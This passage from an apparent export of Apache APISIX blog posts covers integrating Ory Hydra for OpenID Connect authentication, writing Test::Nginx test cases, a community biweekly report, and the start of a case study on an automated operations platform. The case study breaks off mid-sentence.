Authentication](https://apisix.apache.org/blog/2021/08/25/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication/#what-is-authentication).\\n\\nOne of the biggest advantages of Ory Hydra is that it implements the OAuth and OpenID Connect standards instead of forcing you to use \\"Hydra user management\\" (login, logout, profile management, registration), a specific template engine, or a predefined front end.\\n\\nIt allows to use the authentication mechanisms required by your program (token-based 2FA, SMS 2FA, etc.) and implement user management and login in your technology stack. Of course, you can also use existing solutions, such as [authboss](https://github.com/go-authboss/authboss). It gives you all the great features of OAuth 2.0 and OpenID Connect while being minimally intrusive to your business logic and technology stack.\\n\\nOAuth 2.0 can be used in many environments for various purposes. The following information may help you decide whether OAuth 2.0 and Hydra are suitable for a certain scenario:\\n\\n1. enable third-party solutions to access your APIs.\\n2. be an Identity Provider like Google, Facebook, or Microsoft.\\n3. enable your browser, mobile, or wearable applications to access your APIs: Running an OAuth2 Provider can work great for this. You don\'t have to store passwords on the device and can revoke access tokens at any time.\\n4. you want to limit what type of information your backend services can read from each other. For example, the comment service should only be allowed to fetch user profile updates but shouldn\'t be able to read user passwords.\\n\\n## Operation steps\\n\\nNext, I will show you how APISIX integrates with Hydra using a real example. In this example, Docker will be used to running the required environment. Please install [Docker](https://docs.docker.com/engine/install/) before doing this.\\n\\n### Step 1: Create and deploy the database\\n\\nFor quick deployment of the test environment, we will use Docker to run PostgreSQL as Hydra\'s database. It\'s not recommended to use Docker to run the database in production.\\n\\n```shell\\ndocker network create hydraguide && \\\\\\ndocker run \\\\\\n  --network hydraguide \\\\\\n  --name ory-hydra-example--postgres \\\\\\n  -e POSTGRES_USER=hydra \\\\\\n  -e POSTGRES_PASSWORD=secret \\\\\\n  -e POSTGRES_DB=hydra \\\\\\n  -d postgres:9.6\\n```\\n\\nThe above command will create a network named `hydraguide` and start a Postgres instance named `ory-hydra-example--postgres` which creates the database `hydra`, the user `hydra`, and the user password `secret`.\\n\\n### Step 2: Deploy Hydra\\n\\nThis step will map `4444` to `5444` and `4445` to `5445` ports, please make sure that these ports are not used.\\n\\n1. The system key can only be set for the new database, and does not support key rotation. This key is used to encrypt the database and needs to be set to the same value each time the process restarts. You can use `/dev/urandom` to generate keys. But make sure that the key must be the same when you define it. For example, you can store the value somewhere:\\n\\n```shell\\nexport SECRETS_SYSTEM=$(export LC_CTYPE=C; cat /dev/urandom | tr -dc \'a-zA-Z0-9\' | fold -w 32 | head -n 1)\\n```\\n\\nSet Hydra\'s database URL to point to your Postgres instance by configuring an environment variable.\\n\\n```shell\\nexport DSN=postgres://hydra:secret@ory-hydra-example--postgres:5432/hydra?sslmode=disable\\n```\\n\\n2. Ory Hydra does not migrate SQL automatically, so you need to manually perform the database migration.\\n\\n```shell\\ndocker pull oryd/hydra:v1.10.6 && \\\\\\ndocker run -it --rm \\\\\\n  --network hydraguide \\\\\\n  oryd/hydra:v1.10.6 \\\\\\n  migrate sql --yes $DSN\\n```\\n\\n3. Run the Hydra server with the following command. For more information, please refer to [deploy-ory-hydra](https://www.ory.sh/docs/hydra/configure-deploy#deploy-ory-hydra).\\n\\n```shell\\ndocker run -d \\\\\\n  --name ory-hydra-example--hydra \\\\\\n  --network hydraguide \\\\\\n  -p 5444:4444 \\\\\\n  -p 5445:4445 \\\\\\n  -e SECRETS_SYSTEM=$SECRETS_SYSTEM \\\\\\n  -e DSN=$DSN \\\\\\n  -e URLS_SELF_ISSUER=https://localhost:5444/ \\\\\\n  -e URLS_CONSENT=http://localhost:9020/consent \\\\\\n  -e URLS_LOGIN=http://localhost:9020/login \\\\\\n  oryd/hydra:v1.10.6 serve all\\n```\\n\\nYou can view Hydra logs using the following command:\\n\\n```shell\\ndocker logs ory-hydra-example--hydra\\n```\\n\\n:::note\\n\\nIf the Hydra password is not specified, you can find the password information in the log. If you forget your password, you will not be able to restart Hydra.\\n\\n:::\\n\\nYou can also use the following commands to view Hydra related introductions and operation commands.\\n\\n```shell\\ndocker run -it --rm --entrypoint hydra oryd/hydra:v1.10.6 help serve\\n```\\n\\n### Step 3: Deploy login and authentication programs\\n\\nLogin Provider and Consent Provider can be two separate web services. Hydra provides sample programs that combine both functions in one application. Next, we\'ll deploy the application using Docker.\\n\\n```shell\\ndocker pull oryd/hydra-login-consent-node:v1.10.6 && \\\\\\ndocker run -d \\\\\\n  --name ory-hydra-example--consent \\\\\\n  -p 9020:3000 \\\\\\n  --network hydraguide \\\\\\n  -e HYDRA_ADMIN_URL=https://ory-hydra-example--hydra:4445 \\\\\\n  -e NODE_TLS_REJECT_UNAUTHORIZED=0 \\\\\\n  oryd/hydra-login-consent-node:v1.10.6\\n```\\n\\nYou can use the following command to check whether the program runs normally:\\n\\n```shell\\ndocker logs ory-hydra-example--consent\\n```\\n\\nReturns the result normally:\\n\\n```shell\\n> hydra-login-consent-logout@0.0.0 serve /usr/src/app\\n> node lib/app.js\\n\\nListening on http://0.0.0.0:3000\\n```\\n\\n### Step 4: Execute the OAuth 2.0 Authorization Code Flow\\n\\nHydra supports the ability to set an OAuth 2.0 consumer and OAuth 2.0 callback URL via the CLI, and is a third-party application that requests access to user resources on the server.\\n\\nThis information is required when configuring the APISIX `openid-connect` plugin:\\n\\n- `id` corresponds to the `client_id` configure by the plugin in the following route.\\n- `secret` corresponds to the `client_secret` configured by the plugin in the following route.\\n- `scope` corresponds to the `scope` configured by the plugin in the following route.\\n\\n```shell\\ndocker run --rm -it \\\\\\n  -e HYDRA_ADMIN_URL=https://ory-hydra-example--hydra:4445 \\\\\\n  -- network hydraguide \\\\\\n  oryd/hydra:v1.10.6 \\\\\\n  clients create --skip-tls-verify \\\\\\n    --id facebook-photo-backup \\\\\\n    --secret some-secret \\\\\\n    --grant-types authorization_code,refresh_token,client_credentials,implicit \\\\\\n    --response-types token,code,id_token \\\\\\n    --scope openid,offline,photos.read \\\\\\n    --callbacks http://127.0.0.1:9010/callback\\n```\\n\\nThe following example will perform an OAuth 2.0 authorization flow. To simplify this, the Hydra CLI provides a helper command called `hydra token user`.\\n\\n```shell\\n docker run --rm -it \\\\\\n  --network hydraguide \\\\\\n  -p 9010:9010 \\\\\\n  oryd/hydra:v1.10.6 \\\\\\n  token user --skip-tls-verify \\\\\\n    --port 9010 \\\\\\n    --auth-url https://localhost:5444/oauth2/auth \\\\\\n    --token-url https://localhost:5444/oauth2/token \\\\\\n    --client-id facebook-photo-backup \\\\\\n    --client-secret some-secret \\\\\\n    --scope openid,offline,photos.read\\n```\\n\\nIf the returned result is as follows, the configuration is normal:\\n\\n```shell\\nSetting up home route on http://127.0.0.1:9010/\\nSetting up callback listener on http://127.0.0.1:9010/callback\\nPress ctrl + c on Linux / Windows or cmd + c on OSX to end the process.\\nIf your browser doesn\'t open automatically, navigate to:\\n\\n        http://127.0.0.1:9010/\\n```\\n\\nThis step will start a user login program, we will use this program in the next step.\\n\\n### Step 5: Start APISIX and configure routing\\n\\nIf you do not have APISIX installed, please refer to: [Installation](https://apisix.apache.org/docs/apisix/next/installation-guide).\\n\\nOnce installed, just create routes and configure `openid-connect` plugin. In order to verify the effect more intuitively, we also need to start an NGINX service as upstream, you can also use existing upstream services.\\n\\n:::note\\n\\nAPISIX in this example is installed on the host. If it is started with Docker, there may be network problems.\\n\\n:::\\n\\n1. First create an NGINX upstream using Docker.\\n\\n```shell\\ndocker run -d --name test-nginx -p 8081:80 nginx\\n```\\n\\n2. Create a route and configure the `openid-connect` plugin with the following commands.\\n\\n`client_id`, `client_secret` and `scope` are the IDs set in step four. You can refer to Preparing for [Production for additional](https://www.ory.sh/docs/hydra/production#exposing-administrative-and-public-api-endpoints) information. From the above link, we can see that the address of `discovery` is `https://{IP:Port}/.well-known/openid-configuration`.\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 \\\\\\n-H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/*\\",\\n    \\"plugins\\":{\\n        \\"openid-connect\\":{\\n            \\"client_id\\":\\"facebook-photo-backup\\",\\n            \\"client_secret\\":\\"some-secret\\",\\n            \\"discovery\\":\\"https://127.0.0.1:5444/.well-known/openid-configuration\\",\\n            \\"scope\\":\\"openid\\",\\n            \\"token_endpoint_auth_method\\": \\"client_secret_basic\\",\\n            \\"bearer_only\\": false,\\n            \\"redirect_uri\\":\\"http://127.0.0.1:9080/callback\\"\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"type\\":\\"roundrobin\\",\\n        \\"nodes\\":{\\n            \\"127.0.0.1:8081\\":1\\n        }\\n    }\\n}\'\\n```\\n\\n### Step 6: Visit the webpage\\n\\n  1. Enter `http://127.0.0.1:9080/index.html` in the browser. Since the `openid-connect` plugin has been enabled, the page is redirected to the login page, enter the default account password into the user authentication program.\\n\\n  ![network-error/Authentication page](https://static.apiseven.com/2022/blog/0704/1.png)\\n\\n  2. Select the authentication protocol and click `Allow Access`.\\n\\n  ![network-error/select page](https://static.apiseven.com/2022/blog/0704/2.png)\\n\\n  3. After successful verification, you can access the upstream service page.\\n\\n  ![network-error/upstream page](https://static.apiseven.com/2022/blog/0704/3.png)\\n\\n## Summary\\n\\nThis article mainly introduces how Hydra integrates with APISIX and the application scenarios of Hydra. You only need to install Hydra related programs on the server, and you can use it directly as your authentication program.\\n\\n## Related reading\\n\\n- [Using the Apache APISIX OpenID Connect Plugin for Okta Centralized Authentication](https://apisix.apache.org/blog/2021/08/16/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication)\\n- [Centralized authentication using the OpenID Connect plug-in for Apache APISIX](https://apisix.apache.org/blog/2021/08/25/using-the-apache-apisix-openid-connect-plugin-for-centralized-authentication)"},{"id":"Getting Started with APISIX Test Cases","metadata":{"permalink":"/blog/2022/06/27/getting-start-with-apisix-test-cases","source":"@site/blog/2022/06/27/getting-start-with-apisix-test-cases.md","title":"Getting Started with APISIX Test Cases","description":"This article introduces the test case of APISIX and how to write the test case, and shows the actual operation effect from the local and GitHub.","date":"2022-06-27T00:00:00.000Z","formattedDate":"June 27, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":11.17,"truncated":true,"authors":[{"name":"Zeping Bai","title":"Author","url":"https://github.com/bzp2010","image_url":"https://github.com/bzp2010.png","imageURL":"https://github.com/bzp2010.png"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"APISIX integrates with Ory Hydra","permalink":"/blog/2022/07/04/apisix-integrates-with-hydra"},"nextItem":{"title":"Biweekly Report (Jun 1 - Jun 15)","permalink":"/blog/2022/06/21/weekly-report-0621"}},"content":"> This article introduces the test case of APISIX and how to write the test case, and shows the actual operation effect from the local and GitHub.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nApache APISIX is a dynamic, real-time, high-performance API Gateway, it provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more. You can use APISIX API Gateway to handle traditional north-south traffic, as well as east-west traffic between services.\\n\\nUnder normal circumstances, to ensure the normal operation of the software, we generally use various techniques and methods to check the functions of the software manually or automatically to ensure that it is running normally before the software goes online. We call this operation QA (testing). Testing is generally divided into unit testing, E2E testing and chaos testing.\\n\\nUnit testing is used to check the correctness of a single module (such as checking whether the serialization/deserialization of a certain RPC, data encryption and decryption are normal), but the test lacks a global perspective on the system. The E2E test (ie end-to-end test) can make up for the insufficiency of the unit test. The test runs the entire system and external dependent services, and checks the integration of the system and other systems through real software calls; the chaos test passes the test. Create unexpected situations between various components of the system, such as OOM Kill, network interruption, etc., to test the tolerance and capability of the entire system for errors and errors. The testing of APISIX is more inclined to E2E testing to ensure the correctness of its own functions and integration with other systems.\\n\\n## APISIX Test Case Introduction\\n\\nAPISIX is the world\'s most active API gateway, and its stability and service robustness need to be guaranteed to a certain extent, so how to avoid potential errors in APISIX? This needs to be achieved through test cases.\\n\\nA test script is not just a program file executed by the machine under test. For developers, the test script can be used to test all functions of the software, including the running status of the program under different configurations and different input parameters. For the user, the test provides a specific example of the use of a function module, such as: the configuration and input that the program can accept, and what kind of output results are expected to be obtained. If the user encounters something they do not understand when referring to the documentation, they can refer to the existing test cases to find out whether there are similar usage scenarios.\\n\\nIn the APISIX project, Github Action is usually used to run CI tests and execute the test scripts shown in the following figure. Many APISIX developers encounter a variety of problems when writing test cases. Hope this article will help you write APISIX test cases.\\n\\n![network error/apisix test case](https://static.apiseven.com/2022/blog/0627/1.png)\\n\\n## Write test cases\\n\\nThe test cases of APISIX are written based on the `Test::NGINX` test framework, which is a test environment implemented on the basis of the Perl language, which can provide script-based automated testing capabilities, and provides a large-scale test and quality assurance work for APISIX. support. Of course, it doesn\'t matter if you don\'t use Perl, because in most scenarios, you don\'t need to write Perl code, you only need to use the ability of `TEST::NGINX` encapsulation. If you have special needs, you can combine it with Lua code to enhance it.\\n\\nThe test cases of APISIX are stored in the `./apisix/t` directory. Next, we will introduce you to how to write test cases by adding the opa plugin as an example.\\n\\n1. You need to create a test file ending with `.t`, eg `./t/plugin/opa.t`. If you are adding features to existing functions, you can directly add test cases to the corresponding test file, and add the fixed-format `ASF 2.0` protocol to the file.\\n\\n2. The main function of this part is to automatically add `no_error_log` to all test cases in the `opa.t` file, so that you don\'t need to add `error_log` related code under each code, you can copy and use this code directly. segment code. In this way, some duplication of code can be reduced.\\n\\n```perl\\nadd_block_preprocessor(sub {\\n    my ($block) = @_;\\n\\n    if ((!defined $block->error_log) && (!defined $block->no_error_log)) {\\n        $block->set_value(\\"no_error_log\\", \\"[error]\\");\\n    }\\n\\n    if (!defined $block->request) {\\n        $block->set_value(\\"request\\", \\"GET /t\\");\\n    }\\n});\\n\\nrun_tests();\\n\\nDATA\\n```\\n\\n3. Each test case has a fixed beginning, and the general format is as follows.\\n\\n```perl\\n=== TEST 1: sanity\\n```\\n\\n`===` is a fixed syntax structure at the beginning of a test case, and `TEST 1` represents the first test case in this file. `sanity` is the name of the test. Usually named after the specific purpose of the test case.\\n\\n4. Next is the body of the test case. Almost every plugin in APISIX defines some parameters and properties, and pre-defines JSON schema, so we need to check whether the input parameters of the plugin can be properly verified. In this way, we can check whether the data we input can be properly verified by the rules of JSON schema.\\n\\n```perl\\n--- config\\n    location /t {\\n        content_by_lua_block {\\n            local test_cases = {\\n                {host = \\"http://127.0.0.1:8181\\", policy = \\"example/allow\\"},\\n                {host = \\"http://127.0.0.1:8181\\"},\\n                {host = 3233, policy = \\"example/allow\\"},\\n            }\\n            local plugin = require(\\"apisix.plugins.opa\\")\\n            for _, case in ipairs(test_cases) do\\n                local ok, err = plugin.check_schema(case)\\n                ngx.say(ok and \\"done\\" or err)\\n            end\\n        }\\n    }\\n--- response_body\\ndone\\nproperty \\"policy\\" is required\\nproperty \\"host\\" validation failed: wrong type: expected string, got number\\n```\\n\\nBy reading the [source code](https://github.com/apache/apisix/blob/master/apisix/plugins/opa.lua#L46) of the `opa` plugin, you can see that the `opa` plugin requires both `host` and `policy` to exist, so three rules need to be defined here.\\n\\n- Enter the correct parameters, including `host` and `policy`. So the return result will be `done`;\\n- Enter only the `host` parameter. Does not meet the requirements of `host` and `policy` at the same time, so the expected return result of this test will be `property \\"policy\\" is required`;\\n- A `host` value of the wrong type (integer) was entered. Because the `host` parameter must be a string type set in the source code, the return result will be `property \\"host\\" validation failed: wrong type: expected string, got number`.\\n\\n```perl\\n--- config\\n    location /t {\\n        content_by_lua_block {\\n...\\n                ngx.say(ok and \\"done\\" or err)\\n            end\\n        }\\n    }\\n--- response_body\\ndone\\n...\\n```\\n\\nIn general, each test case needs to use the `/t` function, for example, you need to call Lua code, define `location`. You can use the `content_by_lua_block` method to call some code-assisted tests, and finally print the response information in the `ngx.say` method, and then use the `--- response_body` method to check whether the above program runs correctly. There is no need to enter `request` and `error` manually, because you have already added them automatically through the script.\\n\\n```perl\\n    local plugin = require(\\"apisix.plugins.opa\\")\\n    for _, case in ipairs(test_cases) do\\n        local ok, err = plugin.check_schema(case)\\n        ngx.say(ok and \\"done\\" or err)\\n```\\n\\nThe above code represents a module that imports the APISIX Plugin `opa` plugin and calls the `plugin.check_schema` function. Then pass the `for` loop to call the parameters and return the corresponding results according to the test situation.\\n\\n5. Next, we need to set up an environment for testing. For plugins, it is to create a route, and then associate the plugin to this route. After the setup is complete, we can verify whether the internal logic of the plugin is implemented correctly by sending a request.\\n\\n```perl\\n=== TEST 2: setup route with plugin\\n--- config\\n    location /t {\\n        content_by_lua_block {\\n            local t = require(\\"lib.test_admin\\").test\\n            local code, body = t(\'/apisix/admin/routes/1\',\\n                 ngx.HTTP_PUT,\\n                 [[{\\n                        \\"plugins\\": {\\n                            \\"opa\\": {\\n                                \\"host\\": \\"http://127.0.0.1:8181\\",\\n                                \\"policy\\": \\"example\\"\\n                            }\\n                        },\\n                        \\"upstream\\": {\\n                            \\"nodes\\": {\\n                                \\"127.0.0.1:1980\\": 1\\n                            },\\n                            \\"type\\": \\"roundrobin\\"\\n                        },\\n                        \\"uris\\": [\\"/hello\\", \\"/test\\"]\\n                }]]\\n                )\\n            if code >= 300 then\\n                ngx.status = code\\n            end\\n            ngx.say(body)\\n        }\\n    }\\n--- response_body\\npassed\\n```\\n\\nIn the above example, `lib_test_admin` is used to import into the `t` function, create a route with `id` of `1`, and then use the `PUT` method to pass in the data. In this test, we did not check the data format, because the test case only needs to ensure that the route can be created normally using the Admin API. Of course, we also need to judge the exception. If the status code is greater than or equal to `300`, then The specific information will be printed.\\n\\nIn APISIX\'s test cases, you will find that many of the tests include the following code:\\n\\n```perl\\nlocal t = require(\\"lib.test_admin\\").test\\nlocal code, body = t(\'/apisix/admin/routes/1\', ngx.HTTP_PUT)\\n```\\n\\nThe above code means importing the `lib.test_admin` module and encapsulating it with the test function to send the request. It reduces the repetitive code when we call HTTP interfaces such as APISIX Admin API, and only needs to simply call and check the returned result.\\n\\n6. In the third test, we don\'t need to repeat the creation of the route since it was already created in the second test.\\n\\n```perl\\n=== TEST 3: hit route (with correct request)\\n--- request\\nGET /hello?test=1234&user=none\\n--- more_headers\\ntest-header: only-for-test\\n--- response_body\\nhello world\\n```\\n\\nThe above example defines `request`. Since we defined `/hello` and `/test` paths in the previous test, we can send a `GET` request to `/hello` and it will then send a `test=1234` and `user=none` for the `query` parameter. You can also add response headers via `more_headers`, such as adding a `test-header` response header to a request sent to `hello`.\\n\\nThe above test is to test whether adding the correct request header can be successful. You can also add error headers in subsequent test examples and verify the results. If you need to use `POST` request, you can also change `GET /hello` in the above code to `POST /hello`.\\n\\nIn some tests, you may need to create multiple upstreams or routes. In this case, you can define an array, then define these corresponding values in the array, and use the `for` method to call the `t` function in a loop, and then Let it call the Admin API interface of APISIX through `put` to create a route or upstream normally. This method is also a more common method of testing, called: Table driving test, which is a method of driving tests through tables, which reduces some repetitive codes. For details, please refer to the [APISIX test case quick start video](https://www.bilibili.com/video/BV1qF411G78j?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=d427acb1117c07aeea8968e15736e375) and the `opa2.t` [test case](https://github.com/apache/apisix/blob/master/t/plugin/opa2.t#L39).\\n\\n## Run the test case\\n\\nThe test case requires the source code to install APISIX. For the specific installation method, please refer to [Building APISIX from source](https://apisix.apache.org/docs/apisix/next/building-apisix). Next, we will focus on how to run test cases and error checking.\\n\\n### Running locally\\n\\nTypically, you can run a test case locally using the following command:\\n\\n```shell\\nPATH=/usr/local/openresty/nginx/sbin:/usr/bin PERL5LIB=.:$PERL5LIB FLUSH_ETCD=1 prove -Itest-nginx/lib -r t/admin\\n```\\n\\nThe above commands are interpreted as follows:\\n\\n- `PATH` specifies the directory where `openresty/nginx` is located, which can avoid conflicts caused by incorrect configuration of some environments. If OpenResty in the environment is installed in other locations, it can also be specified through this command.\\n- `PERL5LIB` specifies importing locally using `Perl`. Import the PERL library that exists in this path and some of the PERL libraries attached via environment variables.\\n- `FLUSH_ETCD` specifies that after each test file is executed, all data is cleared. It needs to call the `etcdctl` function, and it needs to ensure that the `etcdctl` executable file can be found in the `PATH`.\\n- `prove` invokes the test program to start the test execution.\\n- `-Itest-nginx/lib` means import the `Itest-nginx/lib` library.\\n- `-r` means to automatically find test files. If a path is specified, all test files under this path will be searched.\\n- `t/admin` means to specify the test case search path, and it can also be specified to a unique `.t` file for qualification.\\n  \\nThe following is the normal return result.\\n\\n![network error/normal return result](https://static.apiseven.com/2022/blog/0627/5.png)\\n\\nIf the test fails, the following message appears:\\n\\n![network error/fail return result](https://static.apiseven.com/2022/blog/0627/2.png)\\n\\nThe above information will tell you which test case in which test file failed.\\n\\n### Running Github\\n\\nIn general, when submitting code in Github, the output results are similar to those of local testing.\\n\\nFirst select the wrong execution workflow, the main test cases are in the build series CI.\\n\\n![network error/Github CI example](https://static.apiseven.com/2022/blog/0627/3.png)\\n\\nWe can see that, in this example, line `416` is reporting an error. Through the error information, we can get that there is an error in a test case in a certain test file, and the developer can look for the correction in direction. It should be noted that there may be some strange errors in CI, which may be caused by temporary abnormalities in the CI environment. If the code in the corresponding module has not been modified, these errors can be ignored.\\n\\n![network error/Github CI error example](https://static.apiseven.com/2022/blog/0627/4.png)\\n\\n## Summary\\n\\nThis article mainly introduces the relevant process of testing, as well as the composition of APISIX test cases and how to write test cases. I hope you can have a general understanding of APISIX test cases through this article.\\n\\nHowever, the text only mentions some core content in the APISIX test framework, and fails to cover all the content in the TEST::NGINX framework. In fact, there are many powerful capabilities in `TEST::NGINX`. We can use [Test::Nginx::Socket](https://metacpan.org/pod/Test::Nginx::Socket) documentation for more usage. If you want to learn more about writing test cases, you can also watch the [APISIX Test Cases Quick Start video](https://www.bilibili.com/video/BV1qF411G78j?spm_id_from=333.1007.top_right_bar_window_history.content.click&vd_source=d427acb1117c07aeea8968e15736e375)."},{"id":"Biweekly Report (Jun 1 - Jun 15)","metadata":{"permalink":"/blog/2022/06/21/weekly-report-0621","source":"@site/blog/2022/06/21/weekly-report-0621.md","title":"Biweekly Report (Jun 1 - Jun 15)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2022-06-21T00:00:00.000Z","formattedDate":"June 21, 2022","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":1.615,"truncated":true,"authors":[],"prevItem":{"title":"Getting Started with APISIX Test Cases","permalink":"/blog/2022/06/27/getting-start-with-apisix-test-cases"},"nextItem":{"title":"Build automated operation platform based on Apache APISIX","permalink":"/blog/2022/06/14/automated-operation-base-apache-apisix"}},"content":"> From Jun 1st to Jun 15th, 30 contributors submitted 73 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/2022/weeklyreport/0615/174762816-bd9ccd9e-0053-4835-bd02-087645698f3a.png)\\n\\n![New Contributors](https://static.apiseven.com/2022/weeklyreport/0615/174762904-058d6973-2a31-4b74-ab83-b6e6f32ca368.png)\\n\\n## Good first issue\\n\\n### Issue #7164\\n\\n**Link**: https://github.com/apache/apisix/issues/7164\\n\\n**Description**: Currently we are using Semantic Pull Requests to check in PR but the project is no longer maintained. We need some alternatives.\\n\\ne.g. https://github.com/amannn/action-semantic-pull-request\\n\\n## Highlights of Recent Features\\n\\n- [Support get upstream cert from SSL object](https://github.com/apache/apisix/pull/7221)\uff08Contributor: [soulbird](https://github.com/soulbird)\uff09\\n\\n- [Add support for capturing OIDC refresh tokens](https://github.com/apache/apisix/pull/7220)\uff08Contributor: [NMichas](https://github.com/NMichas)\uff09\\n\\n- [Proxy Redis protocol support add metrics](https://github.com/apache/apisix/pull/7183)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n- [Stream subsystem supports `prometheus` plugin](https://github.com/apache/apisix/pull/7174)\uff08Contributor: [spacewander](https://github.com/spacewander)\uff09\\n\\n## Recent Blog Recommendations\\n\\n- [Installation and performance testing of API Gateway Apache APISIX on AWS Graviton3](https://apisix.apache.org/blog/2022/06/07/installation-performance-test-of-apigateway-apisix-on-aws-graviton3)\\n\\n- [Architecture evolution of investment platforms with API gateway](https://apisix.apache.org/blog/2022/06/14/xueqiu-with-apache-apisix)\\n\\n- [Implementation of canary release solution based on Apache APISIX](https://apisix.apache.org/blog/2022/06/14/how-mse-supports-canary-release-with-apache-apisix)\\n\\n- [Practice of localized application with API gateway in the Middle East](https://apisix.apache.org/blog/2022/06/14/beeto-with-apache-apisix)\\n\\n- [Build automated operation platform based on Apache APISIX](https://apisix.apache.org/blog/2022/06/14/automated-operation-base-apache-apisix)\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience."},{"id":"Build automated operation platform based on Apache APISIX","metadata":{"permalink":"/blog/2022/06/14/automated-operation-base-apache-apisix","source":"@site/blog/2022/06/14/automated-operation-base-apache-apisix.md","title":"Build automated operation platform based on Apache APISIX","description":"This article introduces how to implement an automatic operation based on APISIX, and more details from the user login and authentication scenarios.","date":"2022-06-14T00:00:00.000Z","formattedDate":"June 14, 2022","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":11.655,"truncated":true,"authors":[{"name":"Qing Chen","title":"Author","url":"https://github.com/chenqing24","image_url":"https://avatars.githubusercontent.com/u/3502467?v=4","imageURL":"https://avatars.githubusercontent.com/u/3502467?v=4"},{"name":"Fei Han","title":"Technical Writer","url":"https://github.com/hf400159","image_url":"https://github.com/hf400159.png","imageURL":"https://github.com/hf400159.png"}],"prevItem":{"title":"Biweekly Report (Jun 1 - Jun 15)","permalink":"/blog/2022/06/21/weekly-report-0621"},"nextItem":{"title":"Practice of localized application with API gateway in the Middle East","permalink":"/blog/2022/06/14/beeto-with-apache-apisix"}},"content":"> In this article, Chen Qing, the former operation and maintenance manager of Tongcheng Digital Technology, introduces how to implement an automated operation and maintenance platform based on Apache APISIX.\\r\\n\\r\\n\x3c!--truncate--\x3e\\r\\n\\r\\n## Background\\r\\n\\r\\nAt the end of 2019, the company encountered some business pain points in the process of business research and development. For example, the company\'s development technology stack is java related, while the operation and maintenance engineers are good at shell and python scripts, which cannot be directly connected; The company itself is in a period of rapid growth, and the development engineers are insufficient to support the daily operation and maintenance work and the development of the operation and maintenance platform; In the existing operation and maintenance platform, a variety of open source tools are used, which are not integrated and difficult to manage. Therefore, I initiated the project of automatic operation and maintenance platform, hoping to achieve a rapid development model through the operation and maintenance platform, so that the operation and maintenance engineers can develop their own businesses and provide rapid iterative services.\\r\\n\\r\\n## Why Apache APISIX?\\r\\n\\r\\nDuring the selection of gateway, we have carried out the actual test. Compared with other gateways, APISIX can basically achieve 90% of the functions of NGINX, and supports a variety of load balancing strategies and mechanisms that support multilingual plugins. It also supports soft WAF, which can cover 95% of our security business scenarios. As a cloud native API gateway, APISIX also provides powerful logging functions and supports custom log formats. Therefore, access log can be directly connected to elk. Since APISIX also supports the development of custom plugins, it can be flexibly extended according to our needs. Thanks to the basic functions of APISIX and the powerful plugin system, the development cost can be effectively reduced.\\r\\n\\r\\n## Automation operation and maintenance platform architecture\\r\\n\\r\\nThe overall architecture of the automation operation and maintenance platform is as follows:\\r\\n\\r\\n![Architecture Diagram](https://static.apiseven.com/2022/blog/0614/auto-en1.png)\\r\\n\\r\\n- Storage layer: the core is CMDB. Its main function is to record and manage the attributes of the organization\'s business and its resources, as well as the relationships between them. Not only is it responsible for querying the initial status of all business changes, but also all business resource changes should be fed back and recorded in it to realize the control of business standards and specifications. The storage layer also contains some authority management data, business work order flow data, and monitoring alarm time sequence data;\\r\\n\\r\\n- Public basic service layer: the API that provides atomic services can also be regarded as the basic platform, reusing a large number of open-source tools;\\r\\n\\r\\n- Business arrangement layer: it needs to be designed according to the actual business. The engineer\'s work is to adapt the atomic business API to the message, process combination, data reading and writing as required, and package it into an interface for front-end calls;\\r\\n\\r\\n- Gateway layer: the layer where APISIX is located in the business boundary of the background service. It is responsible for load balancing, service registration, and discovery, user authentication, transcoding of basic network message data, unified recording of internal and external interaction logs, partial security control, etc. The common services that are irrelevant to the business are uniformly placed in this layer;\\r\\n\\r\\n- Presentation layer: from the perspective of users, design convenient interactive interfaces. An open-source front-end fully responsive admin web page template is used here. Even if developers are not familiar with JavaScript, they can implement basic forms and reports by themselves.\\r\\n\\r\\n## Components used by the platform\\r\\n\\r\\n- Core gateway Apache APISIX: mainly responsible for logging, network security, and load balancing. In addition, we not only realize some functions of the advanced business gateway through custom plugins but also integrate with other services through APIs to quickly realize various specified functions and effectively reduce development costs;\\r\\n\\r\\n- API management tool YAPI: it is responsible for the specification definition of the interface, the preparation of test cases, and the data source of ACL;\\r\\n\\r\\n- Access control component [Casbin](https://github.com/casbin/casbin): a lightweight, multi-mode, and strong paradigm cross-language open-source access control framework. We use [PyCasbin](https://github.com/casbin/pycasbin) based on RESTful;\\r\\n\\r\\n- Data storage: MySQL 5.7;\\r\\n\\r\\n- [mug-skeleton](https://github.com/chenqing24/mug-skeleton): the self-developed web framework is mainly used for deeper technical control.\\r\\n\\r\\n- Connected third-party platform-related components\\r\\n\\r\\n  - CMDB (self-research): a layer of RESTful API is outsourced in the open-source 